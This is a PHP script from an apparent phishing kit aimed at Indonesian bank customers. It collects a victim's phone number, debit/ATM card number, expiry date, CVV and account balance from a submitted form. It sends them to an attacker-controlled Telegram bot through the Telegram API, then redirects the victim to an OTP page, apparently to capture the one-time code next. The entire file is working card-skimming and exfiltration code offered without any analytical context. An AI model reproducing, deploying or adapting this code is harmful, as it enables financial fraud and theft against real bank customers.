<?php 



session_start();
include "./telegram.php";

$_SESSION['nope'] = $_POST['phoneNumber'];

$message = "━─━─༺Sudah Terdaftar༻─━─━\n\n"."𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲 :\n".  $_POST ['nope1']. "\n𝗡𝗼𝗺𝗼𝗿 𝗞𝗮𝗿𝘁𝘂 𝗗𝗲𝗯𝗶𝘁/𝗔𝗧𝗠 : \n". $_POST ['debit']. "\n𝗠𝗮𝘀𝗮 𝗕𝗲𝗿𝗹𝗮𝗸𝘂 :\n". $_POST ['valid'].  "\n𝗖𝗩𝗩 :\n". $_POST ['cvv']. " \n𝗦𝗮𝗹𝗱𝗼 𝗧𝗲𝗿𝗮𝗸𝗵𝗶𝗿 : \n𝗥𝗽 : " .$_POST ['saldo'];
function sendMessage($telegram_id, $message, $id_bot)
{
$url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}
sendMessage($telegram_id, $message, $id_bot);
header("Location:  otp.html");
?> 